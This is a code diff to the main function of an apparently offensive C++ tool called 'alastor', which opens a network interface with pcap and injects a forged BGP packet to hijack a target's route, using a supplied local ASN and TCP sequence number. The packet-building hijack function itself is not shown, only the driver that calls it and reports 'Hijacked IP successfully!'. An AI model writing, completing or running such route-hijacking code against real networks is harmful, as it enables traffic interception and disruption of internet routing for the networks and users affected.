@@ -1,8 +1,8 @@
 #include "alastor.h"
 
 int main(int argc, char* argv[]) {
-	if (argc != 4) {
-		cout << "Usage:" << endl << "alastor [target] [old destination] [new destination]" << endl;
+	if (argc != 5) {
+		cout << "Usage:" << endl << "alastor [target] [old destination] [local ASN] [seq]" << endl;
 		return 1;
 	}
 
@@ -10,15 +10,15 @@ int main(int argc, char* argv[]) {
 
 	cout << "Which interface number would you like to use?" << endl;
 	int ii = 1;
-	vector<string> ifaces = getDevices();
-	for (string dev : ifaces) {
-		cout << "Number " << to_string(ii) << ": " << dev << endl;
+	vector<iface> ifaces = getDevices();
+	for (iface dev : ifaces) {
+		cout << "Number " << to_string(ii) << ": " << dev.name << endl;
 		ii++;
 	}
 	string ifacen;
 	cin >> ifacen;
 
-	pcap_t* handle = pcap_open_live(ifaces[stoi(ifacen) - 1].c_str(), 65536, 0, 1, errbuf);
+	pcap_t* handle = pcap_open_live(ifaces[stoi(ifacen) - 1].name.c_str(), 65536, 0, 1, errbuf);
 	if (handle == NULL) {
 		cout << endl << "Failed to open pcap handle." << endl;
 		return 0;
@@ -37,28 +37,13 @@ int main(int argc, char* argv[]) {
 		cout << endl << "Failed to find MAC address for default gateway." << endl;
 		return 0;
 	}
-
-	uint32_t seq = 0;
-	if (!open_conn(handle, target, ndest, (uint8_t*)(BYTE*)gateway, seq)) {
-		cout << endl << "Failed to send BGP packet. Are you sure that you've specified the correct interface?" << endl;
-		return 0;
+	
+	if (!hijack(handle, target, odest, ifaces[stoi(ifacen) - 1].ip, htons(stoi(argv[3])), (uint8_t*)(BYTE*)gateway, stoi(argv[4]))) {
+		cout << endl << "Failed to inject BGP packet. Are you sure that you've specified the correct interface?" << endl;
 	}
-	seq += 29;
-
-	if (!hijack(handle, target, odest, ndest, (uint8_t*)(BYTE*)gateway, seq)) {
-		cout << endl << "Failed to send BGP packet. Are you sure that you've specified the correct interface?" << endl;
-		return 0;
+	else {
+		cout << endl << "Hijacked IP successfully!" << endl;
 	}
-	seq += 46;
-
-	cout << endl << "Press CTRL+C to stop" << endl;
-
-	while (1) {
-		if (!keepalive(handle, target, ndest, (uint8_t*)(BYTE*)gateway, seq)) {
-			cout << endl << "Failed to send BGP packet. Are you sure that you've specified the correct interface?" << endl;
-			return 0;
-		}
-		seq += 19;
-		Sleep(30000);
-	}
+	
+	return 1;
 }
